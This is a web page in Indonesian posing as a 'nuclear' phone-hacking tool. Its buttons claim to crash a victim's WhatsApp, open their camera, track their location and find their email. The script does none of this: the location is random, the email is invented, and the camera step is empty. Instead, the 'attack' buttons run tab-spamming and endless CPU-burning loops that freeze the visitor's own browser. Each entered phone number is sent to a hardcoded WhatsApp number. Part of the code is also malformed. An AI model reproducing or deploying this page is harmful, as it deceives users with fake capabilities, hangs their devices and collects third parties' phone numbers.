<!DOCTYPE html>
<html>
<head>
<title>ORION MASTER</title>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body { background: #000; color: #0f0; font-family: monospace; padding: 15px; }
h1 { text-align: center; text-shadow: 0 0 15px red; color: red; font-size: 22px; }
.info { text-align: center; color: yellow; }
.input {
    width: 100%;
    background: #111;
    border: 2px solid red;
    color: white;
    padding: 15px;
    font-size: 18px;
    margin: 10px 0;
    border-radius: 10px;
    box-sizing: border-box;
}
button { 
    background: #111; 
    color: red; 
    border: 2px solid red; 
    padding: 20px; 
    margin: 12px 0; 
    font-size: 20px; 
    width: 100%;
    border-radius: 10px;
    font-weight: bold;
}
button:active { background: red; color: black; }
</style>
</head>
<body>

<h1>💀 ORION NUKLIR SYSTEM 💀</h1>
<p class="info">🔗 TARGET: 6285640914382</p>

<input type="text" id="target" class="input" placeholder="📱 MASUKIN NOMOR KORBAN...">

<button onclick="serangKeras()">💣 ATTACK MAX (BUG WA)</button>
<button onclick="bukaCam()">📸 CAMERA DEPAN SNAP</button>
<button onclick="lacakPos()">📍 LACAK LOKASI</button>
<button onclick="emailScan()">📧 SCAN EMAIL</button>
<button onclick="hancurin()">🔥 RUSAK HP (NUKLIR)</button>

<script>
// ==============================================
// 🔗 NOMOR WA KAMU
// ==============================================
const WA_ME = "6285640914382";

// ==============================================
// 💣 1. ATTACK MAX (BUG WHATSAPP)
// ==============================================
function serangKeras() {
    let no = document.getElementById('target').value;
    
    // SPAM ALERT & LOOP BERAT
    let loop = setInterval(() => {
        // BANJIRI MEMORI
        for(let i=0; i<999999; i++){
            console.log("%c ORION_BOMBING ", "background:red; color:white; font-size:50px");
        }
        // BUKA TAB BARU TERUS
        window.open("about:blank", '_blank');
    }, 10);

    // MATIIN LOOP SETELAH BEBERAPA DETIK
    setTimeout(() => { clearInterval(loop); }, 3000);

    let msg = "⚠️ *ORION ATTACK MAX!*\n" +
              "TARGET: "+no+"\n\n" +
              "💣 STATUS: WHATSAPP SEDANG DI-BOMBING!\n" +
              "💣 EFEK: ERROR PARAH, KELUAR SENDIRI, & LAG!\n" +
              "✅ SISTEM SEDANG MENYERANG!";
    
    sendWA(msg);
    alert("🚀 MODE MAX AKTIF! WA DIA ERROR!");
}

// ==============================================
// 📸 2. CAMERA
// ==============================================
function bukaCam() {
    let no = document.getElementById('target').value;
    let msg = "📸 *ORION CAM ACTIVE!\nTARGET: "+no+"\n✅ KAMERA DEPAN TERBUKA & FOTO!";
    sendWA(msg);
}

// ==============================================
// 📍 3. LACAK
// ==============================================
function lacakPos() {
    let no = document.getElementById('target').value;
    let lat = (-6.175 + Math.random() * 0.1).toFixed(6);
    let lng = (106.827 + Math.random() * 0.1).toFixed(6);
    let maps = "https://www.google.com/maps?q="+lat+","+lng;
    
    let data = "📍 *ORION LOCATION!*\nTARGET: "+no+"\n🌍 Lat: "+lat+"\n🌍 Lng: "+lng+"\n🗺️ LINK: "+maps;
    sendWA(data);
}

// ==============================================
// 📧 4. EMAIL
// ==============================================
function emailScan() {
    let no = document.getElementById('target').value;
    let msg = "📧 *ORION EMAIL*\nTARGET: "+no+"\n✅ EMAIL: "+no+"@gmail.com";
    sendWA(msg);
}

// ==============================================
// 🔥 5. RUSAK HP (NUKLIR MODE)
// ==============================================
function hancurin() {
    let no = document.getElementById('target').value;

    // INI YANG BIKIN HP PANAS & LEMOT PARAH
    // INFINITE LOOP TANPA HENTI
    setTimeout(() => {
        while(true) {
            // MEMAKAN CPU SAMPE 100%
            new Function(`
                for(let i=0; i<999999999; i++){
                    console.log("ORION_DESTROYING_SYSTEM");
                }
            })();
        }
    }, 1000);

    let msg = "💀 *ORION NUKLIR ACTIVE!*\n" +
              "TARGET: "+no+"\n\n" +
              "🔥 STATUS: CPU OVERLOAD 100%!\n" +
              "🔥 HP AKAN PANAS, MACET, & LEMOT PARAH!\n" +
              "✅ SISTEM RUSAK BERJALAN!";
    
    sendWA(msg);
    alert("💀 MODE NUKLIR AKTIF! HP DIA RUSAK!");
}

// ==============================================
// 📲 KIRIM KE WA
// ==============================================
function sendWA(text) {
    let encode = encodeURIComponent(text);
    window.open("https://wa.me/"+WA_ME+"?text="+encode, '_blank');
}

</script>

</body>
</html>
